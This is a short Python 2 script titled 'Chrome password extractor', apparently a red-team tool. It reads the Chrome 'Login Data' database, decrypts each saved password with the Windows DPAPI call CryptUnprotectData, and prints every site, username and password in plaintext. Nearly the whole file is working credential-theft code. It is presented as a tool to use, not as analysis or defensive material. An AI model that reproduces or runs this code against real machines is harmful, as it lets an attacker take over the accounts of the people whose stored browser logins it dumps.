#########################################
#
# Chrome password extractor 
# Written by: Shay Nahari (@Red_Sec_Shay)
#
###############################################
from os import getenv
import sqlite3
import win32crypt
from optparse import OptionParser
from os.path import abspath


HELP = """\.
"""

parser = OptionParser(usage='usage: %prog <optional> -i login file ',
                          version='%prog 1.0', description=HELP)

defaultpath = (getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login Data")
#parser = OptionParser(description = __doc__.splitlines()[0][1:])
parser.set_defaults(mode="passwords")
parser.add_option("-i", "--input", dest="dbfile", help="Chrome password database file to use (default: ./Login Data)", default=defaultpath)
#parser.add_option("-o", "--output", dest="outfile", help="file to save passwords to (default: )", default=None)
options, args = parser.parse_args()

print abspath(options.dbfile)
if options.dbfile:
  # print options.dbfile
   conn = sqlite3.connect(options.dbfile)

print conn
cursor = conn.cursor()
# Get the results
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
  # Decrypt the Password
	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
	if password:
		print 'Site: ' + result[0]
		print 'Username: ' + result[1]
		print 'Password: ' + password